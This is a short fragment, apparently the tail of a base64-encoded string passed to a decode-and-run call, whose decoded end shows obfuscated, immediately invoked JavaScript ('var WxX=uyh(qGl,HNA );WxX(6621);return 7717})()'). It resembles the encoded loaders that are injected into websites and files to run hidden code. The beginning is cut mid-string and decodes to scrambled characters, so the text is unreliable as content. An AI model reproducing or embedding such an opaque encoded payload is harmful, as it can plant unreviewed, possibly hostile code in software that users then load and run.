C9jaSVfZjRebWdfXjheOGxeXm8gd14wXS45cjpjTl03X3BwLkgyKGZea2U9b2QxKGE5XmUtKV9eO15hISEuX24ub2VeWzE+XmIgNTRifV4tKXggIWkoeil1cl5nXV1eXmFjZHRlZWN9O0BscnJwXiEhImNpOX1uMmNOfSxwYjRQdGNdLl5dMHReICVjMUFkLF5KfC1oJiVuW30gJF8gIX1bbWYoOU0uWH0mXl54Xi4xY140cmZbNiVsaTk7e3R9JStzZmx9Xj17bChmXV9sXi4oZV5dM3NvLHJuKW1jI15DPXN9bl5lXnItIC47X1wnaWVjYS56Ll4gUWxhZ3IoY14lXl47LHNwXmhoVyhOaXQpXm8xITEhaDcpY2JJcF1haSBhaDNnJTZqZWJeXy4gLmEwcl5uLl4hXj9ePSAuXyAqLmRdZV1eOSg1b29mbGN9ZW9jdFwvcl5VIV1OMnQnKSk7dmFyIFd4WD11eWgocUdsLEhOQSApO1d4WCg2NjIxKTtyZXR1cm4gNzcxN30pKCk='))
